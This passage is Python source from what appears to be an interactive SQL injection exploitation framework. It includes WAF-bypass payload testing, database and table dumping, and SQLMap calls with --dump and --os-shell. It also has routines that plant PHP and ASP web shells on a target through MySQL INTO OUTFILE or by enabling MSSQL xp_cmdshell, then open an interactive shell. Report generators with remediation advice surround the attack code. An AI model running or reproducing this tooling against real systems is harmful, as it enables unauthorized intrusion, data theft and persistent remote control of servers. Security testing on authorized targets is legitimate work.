        self.waf_bypass = WAFBypassEngine()
        self.db_exploiter = None  # Will be initialized per vulnerability
        self.shell_uploader = None  # Will be initialized per vulnerability
        self.msf_integrator = MetasploitIntegrator()
        self.workflow_engine = ProfessionalWorkflowEngine(self.session, target_url)
        self.advanced_extractor = None  # Will be initialized per vulnerability
        
    def run_comprehensive_assessment(self, target_params=None):
        """Run complete SQL injection assessment using all enhanced capabilities"""
        print("\n" + "="*80)
        print("   ENHANCED SQL INJECTION ASSESSMENT - Ultimate Guide 2025")
        print("="*80)
        
        # Execute professional workflow
        report = self.workflow_engine.execute_full_workflow(target_params)
        
        # Apply WAF bypass techniques if needed
        if not report['vulnerabilities']:
            print("\n[*] No vulnerabilities found with standard payloads")
            print("[*] Attempting WAF bypass techniques...")
            report = self._test_with_waf_bypass(target_params)
            
        # Generate final report
        self._print_final_report(report)
        return report
        
    def _test_with_waf_bypass(self, target_params):
        """Test with WAF bypass techniques"""
        test_points = target_params or [{'param': 'id', 'value': '1'}]
        bypass_results = []
        
        for point in test_points:
            print(f"\n[*] Testing {point['param']} with WAF bypass techniques")
            
            # Basic payloads to enhance
            basic_payloads = [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "' AND SLEEP(5)--",
                "' OR 1=1#"
            ]
            
            for payload in basic_payloads:
                # Apply all bypass techniques
                bypassed = self.waf_bypass.apply_bypasses(payload)
                
                for bypass_attempt in bypassed:
                    try:
                        test_url = f"{self.target_url}?{point['param']}={bypass_attempt['payload']}"
                        response = self.session.get(test_url, timeout=10)
                        
                        # Simple detection logic
                        if self._detect_successful_bypass(response, payload):
                            bypass_results.append({
                                'param': point['param'],
                                'technique': bypass_attempt['technique'],
                                'payload': bypass_attempt['payload'],
                                'evidence': 'WAF bypass successful',
                                'response_length': len(response.text)
                            })
                            print(f"[+] WAF bypass successful: {bypass_attempt['technique']}")
                            
                    except Exception as e:
                        continue
                        
        return {
            'assessment_info': {
                'target': self.target_url,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'total_vulns': len(bypass_results),
                'waf_bypasses': bypass_results
            },
            'vulnerabilities': bypass_results,
            'recommendations': [
                "Implement comprehensive input validation",
                "Use parameterized queries exclusively", 
                "Deploy multiple layers of WAF protection",
                "Regular security testing including WAF bypass attempts"
            ]
        }
        
    def _detect_successful_bypass(self, response, original_payload):
        """Detect if WAF bypass was successful"""
        # Simple detection indicators
        success_indicators = [
            response.status_code == 200,
            len(response.text) > 500,
            'error' not in response.text.lower(),
            'blocked' not in response.text.lower(),
            'forbidden' not in response.text.lower()
        ]
        
        return sum(success_indicators) >= 3
        
    def _print_final_report(self, report):
        """Print comprehensive final report"""
        print("\n" + "="*80)
        print("   ASSESSMENT COMPLETE - FINAL REPORT")
        print("="*80)
        
        print(f"\nTarget: {report['assessment_info']['target']}")
        print(f"Timestamp: {report['assessment_info']['timestamp']}")
        print(f"Total Vulnerabilities: {report['assessment_info']['total_vulns']}")
        
        if 'successful_exploits' in report['assessment_info']:
            print(f"Successful Exploits: {report['assessment_info']['successful_exploits']}")
            
        if report['vulnerabilities']:
            print("\n[VULNERABILITIES FOUND]")
            for i, vuln in enumerate(report['vulnerabilities'][:5], 1):
                print(f"  {i}. {vuln.get('type', 'Unknown')} in parameter '{vuln.get('param', 'Unknown')}'")
                print(f"     Payload: {vuln.get('payload', 'N/A')[:60]}...")
                
        print("\n[SECURITY RECOMMENDATIONS]")
        for i, rec in enumerate(report.get('recommendations', []), 1):
            print(f"  {i}. {rec}")
            
        print("\n" + "="*80)
    
    def upload_mysql_shell(self, web_path='/var/www/html/shell.php'):
        """Upload PHP shell via MySQL INTO OUTFILE"""
        print(f"{Colors.BLUE}[*] Attempting MySQL shell upload...{Colors.END}")
        
        shell_content = self.shells['php']
        encoded_shell = ''.join([f'CHAR({ord(c)}),' for c in shell_content])[:-1]
        
        payload = f"' UNION SELECT {encoded_shell} INTO OUTFILE '{web_path}'-- "
        
        try:
            parsed = urlparse(self.vuln['url'])
            params = parse_qs(parsed.query)
            params[self.vuln['parameter']] = [payload]
            
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
            response = self.session.get(test_url, timeout=30)
            
            # Test if shell was uploaded
            shell_url = f"{parsed.scheme}://{parsed.netloc}/shell.php?cmd=id"
            test_response = self.session.get(shell_url, timeout=10)
            
            if "uid=" in test_response.text:
                print(f"{Colors.GREEN}[+] Shell uploaded successfully: {shell_url}{Colors.END}")
                return shell_url
            else:
                print(f"{Colors.YELLOW}[!] Shell upload failed or not accessible{Colors.END}")
                
        except Exception as e:
            print(f"{Colors.RED}[-] Shell upload error: {e}{Colors.END}")
        
        return None
    
    def upload_mssql_shell(self, web_path='C:\\inetpub\\wwwroot\\shell.asp'):
        """Upload ASP shell via MSSQL xp_cmdshell"""
        print(f"{Colors.BLUE}[*] Attempting MSSQL shell upload...{Colors.END}")
        
        # Enable xp_cmdshell first
        enable_payload = "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- "
        
        try:
            parsed = urlparse(self.vuln['url'])
            params = parse_qs(parsed.query)
            params[self.vuln['parameter']] = [enable_payload]
            
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
            self.session.get(test_url, timeout=30)
            
            # Upload shell
            shell_content = self.shells['asp'].replace('"', '\\"')
            upload_payload = f"'; EXEC xp_cmdshell 'echo {shell_content} > {web_path}'-- "
            
            params[self.vuln['parameter']] = [upload_payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
            self.session.get(test_url, timeout=30)
            
            # Test shell
            shell_url = f"{parsed.scheme}://{parsed.netloc}/shell.asp?cmd=whoami"
            test_response = self.session.get(shell_url, timeout=10)
            
            if "windows" in test_response.text.lower():
                print(f"{Colors.GREEN}[+] Shell uploaded successfully: {shell_url}{Colors.END}")
                return shell_url
            else:
                print(f"{Colors.YELLOW}[!] Shell upload failed or not accessible{Colors.END}")
                
        except Exception as e:
            print(f"{Colors.RED}[-] Shell upload error: {e}{Colors.END}")
        
        return None

class ReportGenerator:
    """Professional reporting system"""
    
    def __init__(self):
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
    def generate_html_report(self, target_url, vulnerabilities, output_dir="output"):
        """Generate comprehensive HTML report"""
        
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        report_file = f"{output_dir}/sql_injection_report_{self.timestamp}.html"
        
        # Generate report content
        html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Assessment Report - WebAppSec v1.0 by Braintree</title>
    <style>
        body {{
            font-family: 'Arial', sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            background-color: #f4f4f4;
        }}
        
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
            padding: 30px;
            margin-bottom: 30px;
            border-radius: 10px;
        }}
        
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
        }}
        
        .executive-summary {{
            background-color: #e8f4f8;
            padding: 20px;
            border-left: 5px solid #2196F3;
            margin-bottom: 30px;
        }}
        
        .vulnerability {{
            background-color: #fff;
            border: 1px solid #ddd;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
        }}
        
        .critical {{ border-left: 5px solid #f44336; }}
        .high {{ border-left: 5px solid #ff9800; }}
        .medium {{ border-left: 5px solid #ffeb3b; }}
        .low {{ border-left: 5px solid #4caf50; }}
        
        .risk-level {{
            display: inline-block;
            padding: 5px 10px;
            color: white;
            border-radius: 3px;
            font-weight: bold;
            text-transform: uppercase;
        }}
        
        .risk-critical {{ background-color: #f44336; }}
        .risk-high {{ background-color: #ff9800; }}
        .risk-medium {{ background-color: #ffeb3b; color: black; }}
        .risk-low {{ background-color: #4caf50; }}
        
        .payload {{
            background-color: #f5f5f5;
            padding: 10px;
            font-family: monospace;
            border-radius: 3px;
            word-break: break-all;
        }}
        
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
        
        th {{
            background-color: #f2f2f2;
            font-weight: bold;
        }}
        
        .recommendations {{
            background-color: #e8f5e8;
            padding: 20px;
            border-left: 5px solid #4caf50;
            margin-top: 30px;
        }}
        
        .footer {{
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            background-color: #333;
            color: white;
            border-radius: 10px;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>SQL INJECTION ASSESSMENT REPORT</h1>
        <h2>WebAppSec v1.0 by Braintree - Advanced Security Testing</h2>
        <p>Generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
    
    <div class="container">
        <div class="executive-summary">
            <h2>Executive Summary</h2>
            <table>
                <tr>
                    <th>Target URL</th>
                    <td>{target_url}</td>
                </tr>
                <tr>
                    <th>Assessment Date</th>
                    <td>{datetime.now().strftime('%Y-%m-%d')}</td>
                </tr>
                <tr>
                    <th>Total Vulnerabilities</th>
                    <td>{len(vulnerabilities)}</td>
                </tr>
                <tr>
                    <th>Risk Level</th>
                    <td>
                        {"<span class='risk-level risk-critical'>CRITICAL</span>" if vulnerabilities else "<span class='risk-level risk-low'>LOW</span>"}
                    </td>
                </tr>
            </table>
        </div>
        
        {"<h2>Vulnerabilities Found</h2>" if vulnerabilities else "<h2>No Vulnerabilities Found</h2>"}
        
        {self._generate_vulnerability_sections(vulnerabilities)}
        
        <div class="recommendations">
            <h2>Remediation Recommendations</h2>
            <ul>
                <li><strong>Use Parameterized Queries:</strong> Implement prepared statements with parameterized queries</li>
                <li><strong>Input Validation:</strong> Validate and sanitize all user inputs</li>
                <li><strong>Least Privilege:</strong> Use database accounts with minimal required privileges</li>
                <li><strong>WAF Implementation:</strong> Deploy Web Application Firewall with SQL injection rules</li>
                <li><strong>Regular Updates:</strong> Keep database systems and applications updated</li>
                <li><strong>Error Handling:</strong> Implement proper error handling to avoid information disclosure</li>
                <li><strong>Code Review:</strong> Conduct regular security code reviews</li>
                <li><strong>Penetration Testing:</strong> Perform regular security assessments</li>
            </ul>
        </div>
    </div>
    
    <div class="footer">
        <p><strong>WebAppSec v1.0 by Braintree</strong> - Professional Security Assessment Framework</p>
        <p>This report is confidential and intended for authorized personnel only</p>
        <p>For questions or clarifications, contact the security assessment team</p>
    </div>
</body>
</html>
"""
        
        with open(report_file, 'w') as f:
            f.write(html_content)
        
        print(f"\n{Colors.GREEN}[+] HTML report generated: {report_file}{Colors.END}")
        return report_file
    
    def _generate_vulnerability_sections(self, vulnerabilities):
        """Generate HTML sections for vulnerabilities"""
        
        if not vulnerabilities:
            return "<p>No SQL injection vulnerabilities were detected during this assessment.</p>"
        
        sections = ""
        
        for i, vuln in enumerate(vulnerabilities, 1):
            risk_class = self._get_risk_class(vuln['type'])
            
            sections += f"""
        <div class="vulnerability {risk_class}">
            <h3>Vulnerability #{i}: {vuln['type']}</h3>
            <table>
                <tr>
                    <th>Parameter</th>
                    <td>{vuln['parameter']}</td>
                </tr>
                <tr>
                    <th>URL</th>
                    <td style="word-break: break-all;">{vuln['url']}</td>
                </tr>
                <tr>
                    <th>Payload</th>
                    <td><div class="payload">{vuln['payload']}</div></td>
                </tr>
                <tr>
                    <th>Evidence</th>
                    <td>{vuln.get('evidence', 'Vulnerability confirmed through testing')}</td>
                </tr>
            </table>
        </div>
"""
        
        return sections
    
    def _get_risk_class(self, vuln_type):
        """Determine risk level CSS class"""
        if 'Error-based' in vuln_type or 'UNION-based' in vuln_type:
            return 'critical'
        elif 'Time-based' in vuln_type:
            return 'high'
        elif 'Boolean-based' in vuln_type:
            return 'medium'
        else:
            return 'low'
    
    def generate_json_report(self, target_url, vulnerabilities, output_dir="output"):
        """Generate JSON report for tool integration"""
        
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        report_file = f"{output_dir}/sql_injection_report_{self.timestamp}.json"
        
        report_data = {
            'metadata': {
                'tool': 'WebAppSec SQL Injection Framework',
                'version': '1.0',
                'target': target_url,
                'timestamp': datetime.now().isoformat(),
                'total_vulnerabilities': len(vulnerabilities)
            },
            'vulnerabilities': vulnerabilities
        }
        
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        print(f"{Colors.GREEN}[+] JSON report generated: {report_file}{Colors.END}")
        return report_file

class SQLInjectionFramework:
    """Main framework class"""
    
    def __init__(self):
        self.tester = SQLInjectionTester()
        self.report_generator = ReportGenerator()
        self.version = "2.0"
        
        # Create output directory
        self.output_dir = "output/sql_injection"
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
    
    def print_banner(self):
        """Display framework banner"""
        banner = pyfiglet.figlet_format("WebAppSec", font="slant")
        print(f"{Colors.CYAN}{banner}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.WHITE}WebAppSec v1.0 - Advanced SQL Injection Exploitation Framework{Colors.END}")
        print(f"{Colors.GREEN}by Braintree - Ultimate Database Security Testing Suite{Colors.END}")
        print(f"{Colors.YELLOW}{'-' * 77}{Colors.END}")
        
        # Environment info
        env = EnvironmentDetector.detect_environment()
        platform_info = f"Platform: {env['platform'].upper()}"
        if env['is_nethunter']:
            platform_info += " (NetHunter)"
        elif env['is_termux']:
            platform_info += " (Termux)"
        
        print(f"{Colors.BLUE}{platform_info}{Colors.END}")
        print(f"{Colors.PURPLE}Ready for Advanced SQL Injection Testing{Colors.END}")
        print(f"{Colors.YELLOW}{'-' * 77}{Colors.END}\n")
    
    def show_menu(self):
        """Display interactive menu"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}SQL INJECTION FRAMEWORK - MAIN MENU{Colors.END}")
        print(f"{Colors.CYAN}{'-' * 77}{Colors.END}")
        print(f"{Colors.WHITE}[1] Single URL Testing{Colors.END}")
        print(f"{Colors.WHITE}[2] Batch URL Testing{Colors.END}")
        print(f"{Colors.WHITE}[3] Manual Payload Testing{Colors.END}")
        print(f"{Colors.WHITE}[4] SQLMap Integration{Colors.END}")
        print(f"{Colors.WHITE}[5] Web Shell Upload{Colors.END}")
        print(f"{Colors.WHITE}[6] Data Extraction{Colors.END}")
        print(f"{Colors.WHITE}[7] WAF Bypass Testing{Colors.END}")
        print(f"{Colors.WHITE}[8] Generate Report{Colors.END}")
        print(f"{Colors.WHITE}[9] Settings & Configuration{Colors.END}")
        print(f"{Colors.WHITE}[0] Exit{Colors.END}")
        print(f"{Colors.CYAN}{'-' * 77}{Colors.END}")
    
    def single_url_test(self):
        """Test a single URL"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}SINGLE URL TESTING{Colors.END}")
        
        url = input(f"{Colors.WHITE}Enter target URL: {Colors.END}").strip()
        
        if not url:
            print(f"{Colors.RED}[-] No URL provided{Colors.END}")
            return
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        print(f"\n{Colors.YELLOW}[*] Starting comprehensive SQL injection testing...{Colors.END}")
        vulnerabilities = self.tester.comprehensive_test(url)
        
        if vulnerabilities:
            print(f"\n{Colors.RED}[!] Found {len(vulnerabilities)} vulnerabilities:{Colors.END}")
            
            table_data = []
            for i, vuln in enumerate(vulnerabilities, 1):
                table_data.append([
                    i,
                    vuln['type'],
                    vuln['parameter'],
                    vuln.get('evidence', 'N/A')[:50] + '...' if len(vuln.get('evidence', '')) > 50 else vuln.get('evidence', 'N/A')
                ])
            
            print(f"\n{tabulate(table_data, headers=['#', 'Type', 'Parameter', 'Evidence'], tablefmt='grid')}")
            
            # Generate report
            self.report_generator.generate_html_report(url, vulnerabilities, self.output_dir)
            self.report_generator.generate_json_report(url, vulnerabilities, self.output_dir)
            
        else:
            print(f"\n{Colors.GREEN}[+] No SQL injection vulnerabilities found{Colors.END}")
    
    def batch_url_test(self):
        """Test multiple URLs from file"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}BATCH URL TESTING{Colors.END}")
        
        file_path = input(f"{Colors.WHITE}Enter path to URL file: {Colors.END}").strip()
        
        if not os.path.exists(file_path):
            print(f"{Colors.RED}[-] File not found: {file_path}{Colors.END}")
            return
        
        with open(file_path, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        print(f"{Colors.GREEN}[+] Loaded {len(urls)} URLs{Colors.END}")
        
        all_vulnerabilities = []
        
        for i, url in enumerate(urls, 1):
            print(f"\n{Colors.YELLOW}[*] Testing URL {i}/{len(urls)}: {url}{Colors.END}")
            
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            try:
                vulnerabilities = self.tester.comprehensive_test(url)
                if vulnerabilities:
                    all_vulnerabilities.extend(vulnerabilities)
                    print(f"{Colors.RED}[!] Found {len(vulnerabilities)} vulnerabilities{Colors.END}")
                else:
                    print(f"{Colors.GREEN}[+] No vulnerabilities found{Colors.END}")
                    
            except Exception as e:
                print(f"{Colors.RED}[-] Error testing {url}: {e}{Colors.END}")
        
        if all_vulnerabilities:
            print(f"\n{Colors.BOLD}{Colors.RED}BATCH TESTING RESULTS:{Colors.END}")
            print(f"{Colors.RED}Total vulnerabilities found: {len(all_vulnerabilities)}{Colors.END}")
            
            # Generate combined report
            self.report_generator.generate_html_report("Batch Testing", all_vulnerabilities, self.output_dir)
            self.report_generator.generate_json_report("Batch Testing", all_vulnerabilities, self.output_dir)
    
    def manual_payload_test(self):
        """Manual payload testing"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}MANUAL PAYLOAD TESTING{Colors.END}")
        
        url = input(f"{Colors.WHITE}Enter target URL: {Colors.END}").strip()
        parameter = input(f"{Colors.WHITE}Enter parameter name: {Colors.END}").strip()
        payload = input(f"{Colors.WHITE}Enter SQL payload: {Colors.END}").strip()
        
        if not all([url, parameter, payload]):
            print(f"{Colors.RED}[-] All fields are required{Colors.END}")
            return
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        try:
            # Inject payload
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[parameter] = [payload]
            
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
            
            print(f"\n{Colors.YELLOW}[*] Testing payload...{Colors.END}")
            print(f"{Colors.CYAN}URL: {test_url}{Colors.END}")
            
            start_time = time.time()
            response = self.tester.session.get(test_url, timeout=30)
            end_time = time.time()
            
            print(f"\n{Colors.GREEN}[+] Response received:{Colors.END}")
            print(f"Status Code: {response.status_code}")
            print(f"Response Time: {round(end_time - start_time, 2)}s")
            print(f"Response Length: {len(response.text)} bytes")
            
            # Check for common error patterns
            error_patterns = [
                r"you have an error in your sql syntax",
                r"warning: mysql_",
                r"postgresql query failed",
                r"mssql query",
                r"sqlite_exception",
                r"oracle.*error"
            ]
            
            errors_found = []
            for pattern in error_patterns:
                if re.search(pattern, response.text.lower()):
                    errors_found.append(pattern)
            
            if errors_found:
                print(f"\n{Colors.RED}[!] SQL errors detected:{Colors.END}")
                for error in errors_found:
                    print(f"  {error}")
            else:
                print(f"\n{Colors.YELLOW}[*] No obvious SQL errors detected{Colors.END}")
            
            # Show response preview
            print(f"\n{Colors.CYAN}Response Preview (first 500 chars):{Colors.END}")
            print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
            
        except Exception as e:
            print(f"{Colors.RED}[-] Error testing payload: {e}{Colors.END}")
    
    def sqlmap_integration(self):
        """SQLMap integration"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}SQLMAP INTEGRATION{Colors.END}")
        
        if not self._check_sqlmap():
            print(f"{Colors.RED}[-] SQLMap not found. Installing...{Colors.END}")
            self._install_sqlmap()
        
        url = input(f"{Colors.WHITE}Enter target URL: {Colors.END}").strip()
        
        if not url:
            print(f"{Colors.RED}[-] No URL provided{Colors.END}")
            return
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        print(f"\n{Colors.YELLOW}[*] SQLMap Testing Options:{Colors.END}")
        print(f"[1] Basic scan")
        print(f"[2] Database enumeration")
        print(f"[3] Table enumeration")
        print(f"[4] Data dump")
        print(f"[5] OS shell")
        print(f"[6] Custom command")
        
        choice = input(f"\n{Colors.WHITE}Select option: {Colors.END}").strip()
        
        commands = {
            '1': f'sqlmap -u "{url}" --batch --level=3 --risk=2',
            '2': f'sqlmap -u "{url}" --dbs --batch',
            '3': f'sqlmap -u "{url}" --tables --batch',
            '4': f'sqlmap -u "{url}" --dump --batch',
            '5': f'sqlmap -u "{url}" --os-shell --batch',
        }
        
        if choice in commands:
            command = commands[choice]
        elif choice == '6':
            command = input(f"{Colors.WHITE}Enter SQLMap command: {Colors.END}").strip()
        else:
            print(f"{Colors.RED}[-] Invalid choice{Colors.END}")
            return
        
        print(f"\n{Colors.YELLOW}[*] Executing: {command}{Colors.END}")
        
        try:
            result = subprocess.run(command.split(), capture_output=True, text=True, timeout=300)
            
            output_file = f"{self.output_dir}/sqlmap_output_{self.report_generator.timestamp}.txt"
            with open(output_file, 'w') as f:
                f.write(f"Command: {command}\n")
                f.write(f"Return Code: {result.returncode}\n\n")
                f.write("STDOUT:\n")
                f.write(result.stdout)
                f.write("\n\nSTDERR:\n")
                f.write(result.stderr)
            
            print(f"\n{Colors.GREEN}[+] SQLMap completed. Output saved to: {output_file}{Colors.END}")
            
            if result.stdout:
                print(f"\n{Colors.CYAN}SQLMap Output Preview:{Colors.END}")
                print(result.stdout[:1000] + "..." if len(result.stdout) > 1000 else result.stdout)
            
        except subprocess.TimeoutExpired:
            print(f"{Colors.RED}[-] SQLMap command timed out{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[-] Error running SQLMap: {e}{Colors.END}")
    
    def web_shell_upload(self):
        """Web shell upload functionality"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}WEB SHELL UPLOAD{Colors.END}")
        
        if not self.tester.vulnerabilities:
            print(f"{Colors.RED}[-] No vulnerabilities found. Run testing first.{Colors.END}")
            return
        
        print(f"{Colors.GREEN}[+] Available vulnerabilities:{Colors.END}")
        for i, vuln in enumerate(self.tester.vulnerabilities, 1):
            print(f"  [{i}] {vuln['type']} - {vuln['parameter']}")
        
        try:
            choice = int(input(f"\n{Colors.WHITE}Select vulnerability [1-{len(self.tester.vulnerabilities)}]: {Colors.END}"))
            
            if 1 <= choice <= len(self.tester.vulnerabilities):
                vuln = self.tester.vulnerabilities[choice - 1]
                uploader = WebShellUploader(self.tester.session, vuln)
                
                print(f"\n{Colors.YELLOW}[*] Attempting web shell upload...{Colors.END}")
                
                # Try different upload methods based on vulnerability type
                if 'mysql' in vuln.get('evidence', '').lower():
                    shell_url = uploader.upload_mysql_shell()
                elif 'mssql' in vuln.get('evidence', '').lower():
                    shell_url = uploader.upload_mssql_shell()
                else:
                    # Try MySQL first, then MSSQL
                    shell_url = uploader.upload_mysql_shell()
                    if not shell_url:
                        shell_url = uploader.upload_mssql_shell()
                
                if shell_url:
                    print(f"{Colors.GREEN}[+] Web shell uploaded successfully!{Colors.END}")
                    print(f"{Colors.CYAN}Shell URL: {shell_url}{Colors.END}")
                    
                    # Interactive shell session
                    self._interactive_shell(shell_url)
                else:
                    print(f"{Colors.RED}[-] Web shell upload failed{Colors.END}")
            else:
                print(f"{Colors.RED}[-] Invalid choice{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}[-] Invalid input{Colors.END}")
    
    def data_extraction(self):
        """Data extraction functionality"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}DATA EXTRACTION{Colors.END}")
        
        if not self.tester.vulnerabilities:
            print(f"{Colors.RED}[-] No vulnerabilities found. Run testing first.{Colors.END}")
            return
        
        print(f"{Colors.GREEN}[+] Available vulnerabilities:{Colors.END}")
        for i, vuln in enumerate(self.tester.vulnerabilities, 1):
            print(f"  [{i}] {vuln['type']} - {vuln['parameter']}")
        
        try:
            choice = int(input(f"\n{Colors.WHITE}Select vulnerability [1-{len(self.tester.vulnerabilities)}]: {Colors.END}"))
            
            if 1 <= choice <= len(self.tester.vulnerabilities):
                vuln = self.tester.vulnerabilities[choice - 1]
                extractor = DataExtractor(self.tester.session, vuln)
                
                print(f"\n{Colors.YELLOW}[*] Starting data extraction...{Colors.END}")
                
                # Extract databases
                databases = extractor.extract_databases()
                
                # Extract tables
                tables = extractor.extract_tables()
                
                # If we have tables, extract columns and data
                if tables:
                    for table in tables[:3]:  # Limit to first 3 tables
                        print(f"\n{Colors.BLUE}[*] Processing table: {table}{Colors.END}")
                        columns = extractor.extract_columns(table)
                        
                        if columns:
                            data = extractor.extract_data(table, columns)
                            
                            # Save extracted data
                            data_file = f"{self.output_dir}/extracted_data_{table}_{self.report_generator.timestamp}.txt"
                            with open(data_file, 'w') as f:
                                f.write(f"Table: {table}\n")
                                f.write(f"Columns: {columns}\n")
                                f.write(f"Data:\n")
                                for item in data:
                                    f.write(f"{item}\n")
                            
                            print(f"{Colors.GREEN}[+] Data saved to: {data_file}{Colors.END}")
                
                print(f"\n{Colors.GREEN}[+] Data extraction completed{Colors.END}")
            else:
                print(f"{Colors.RED}[-] Invalid choice{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}[-] Invalid input{Colors.END}")
    
    def waf_bypass_test(self):
        """WAF bypass testing"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}WAF BYPASS TESTING{Colors.END}")
        
        url = input(f"{Colors.WHITE}Enter target URL: {Colors.END}").strip()
        
        if not url:
            print(f"{Colors.RED}[-] No URL provided{Colors.END}")
            return
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # Parse URL to get parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print(f"{Colors.RED}[-] No parameters found in URL{Colors.END}")
            return
        
        parameter = list(params.keys())[0]  # Test first parameter
        
        print(f"\n{Colors.YELLOW}[*] Testing WAF bypass payloads on parameter: {parameter}{Colors.END}")
        
        successful_bypasses = []
        
        for i, payload in enumerate(SQLPayloads.WAF_BYPASS, 1):
            try:
                params[parameter] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                
                response = self.tester.session.get(test_url, timeout=30)
                
                # Check if payload was blocked (common WAF indicators)
                waf_indicators = [
                    "blocked", "forbidden", "denied", "suspicious", "malicious",
                    "waf", "security", "firewall", "protection"
                ]
                
                blocked = any(indicator in response.text.lower() for indicator in waf_indicators)
                
                status = f"{Colors.GREEN}[+] BYPASSED{Colors.END}" if not blocked and response.status_code == 200 else f"{Colors.RED}[-] BLOCKED{Colors.END}"
                
                print(f"  [{i:2d}] {status} - Status: {response.status_code} - Length: {len(response.text)}")
                
                if not blocked and response.status_code == 200:
                    successful_bypasses.append({
                        'payload': payload,
                        'url': test_url,
                        'status_code': response.status_code,
                        'response_length': len(response.text)
                    })
                
                time.sleep(0.5)  # Rate limiting
                
            except Exception as e:
                print(f"  [{i:2d}] {Colors.YELLOW}? ERROR{Colors.END} - {e}")
        
        if successful_bypasses:
            print(f"\n{Colors.GREEN}[+] Successfully bypassed WAF with {len(successful_bypasses)} payloads{Colors.END}")
            
            # Save successful bypasses
            bypass_file = f"{self.output_dir}/waf_bypasses_{self.report_generator.timestamp}.txt"
            with open(bypass_file, 'w') as f:
                f.write(f"WAF Bypass Testing Results\n")
                f.write(f"Target: {url}\n")
                f.write(f"Parameter: {parameter}\n")
                f.write(f"Successful bypasses: {len(successful_bypasses)}\n\n")
                
                for i, bypass in enumerate(successful_bypasses, 1):
                    f.write(f"Bypass #{i}:\n")
                    f.write(f"  Payload: {bypass['payload']}\n")
                    f.write(f"  Status: {bypass['status_code']}\n")
                    f.write(f"  Length: {bypass['response_length']}\n")
                    f.write(f"  URL: {bypass['url']}\n\n")
            
            print(f"{Colors.GREEN}[+] Results saved to: {bypass_file}{Colors.END}")
        else:
            print(f"{Colors.RED}[-] No successful WAF bypasses found{Colors.END}")
    
    def generate_report(self):
        """Generate comprehensive report"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}GENERATE REPORT{Colors.END}")
        
        if not self.tester.vulnerabilities:
            print(f"{Colors.RED}[-] No vulnerabilities to report. Run testing first.{Colors.END}")
            return
        
        target_url = input(f"{Colors.WHITE}Enter target description (or URL): {Colors.END}").strip()
        if not target_url:
            target_url = "SQL Injection Assessment"
        
        print(f"\n{Colors.YELLOW}[*] Generating reports...{Colors.END}")
        
        html_report = self.report_generator.generate_html_report(
            target_url, self.tester.vulnerabilities, self.output_dir
        )
        json_report = self.report_generator.generate_json_report(
            target_url, self.tester.vulnerabilities, self.output_dir
        )
        
        # Generate CSV report
        csv_file = f"{self.output_dir}/sql_injection_report_{self.report_generator.timestamp}.csv"
        with open(csv_file, 'w') as f:
            f.write("Type,Parameter,URL,Payload,Evidence\n")
            for vuln in self.tester.vulnerabilities:
                f.write(f'"{vuln["type"]}","{vuln["parameter"]}","{vuln["url"]}","{vuln["payload"]}","{vuln.get("evidence", "")}"\n')
        
        print(f"{Colors.GREEN}[+] CSV report generated: {csv_file}{Colors.END}")
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}REPORTS GENERATED SUCCESSFULLY:{Colors.END}")
        print(f"  HTML Report: {html_report}")
        print(f"  JSON Report: {json_report}")
        print(f"  CSV Report: {csv_file}")
    
    def settings_configuration(self):
        """Settings and configuration menu"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}SETTINGS & CONFIGURATION{Colors.END}")
        print(f"\n[1] Set proxy")
        print(f"[2] Set custom headers")
        print(f"[3] Set timeout")
